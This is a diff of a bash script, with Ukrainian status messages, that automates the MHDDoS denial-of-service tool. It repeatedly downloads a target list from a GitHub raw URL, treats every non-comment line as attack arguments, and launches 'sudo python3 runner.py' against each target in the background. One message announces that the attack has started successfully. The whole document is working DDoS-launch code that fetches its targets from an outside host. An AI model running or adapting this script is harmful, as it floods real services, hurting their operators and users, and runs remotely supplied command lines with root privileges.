@@ -32,7 +32,7 @@ while [ 1 == 1 ]
 #echo -e "#####################################\n"
 do
    # Get number of targets in runner_targets. First 5 strings ommited, those are reserved as comments.
-   list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^runner.py" | wc -l)
+   list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
    
    echo -e "\nNumber of targets in list: $list_size \n"
 
@@ -43,14 +43,14 @@ do
    do
             echo -e "\n I = $i"
             # Filter and only get lines that starts with "runner.py". Then get one target from that filtered list.
-            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^runner.py")")
+            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]")")
            
 
             echo "full cmd:"
-            echo "$cmd_line $proxy_interval $rpc"
+            echo "$cmd_line $proxy_interval $threads $rpc"
             
             cd ~/mhddos_proxy
-            nohup sudo python3 $cmd_line $threads $proxy_interval $rpc </dev/null &>/dev/null &
+            nohup sudo python3 runner.py $threads $proxy_interval $rpc $cmd_line --debug </dev/null &>/dev/null &
             echo -e "Атаку розпочато успішно, не переймайтеся, що нічого не виводиться на екран – атака запущена у фоні, щоб вона не завершилася при закритті терміналу"
             echo -e "\nЯкщо цікаво можете у іншій вкладці подивитися через: \n ps aux | grep runner.py , що там запущенно\nАбо скачати: \n sudo apt install --upgrade htop \n, та у реальному часі дивития через: \n htop"
    done
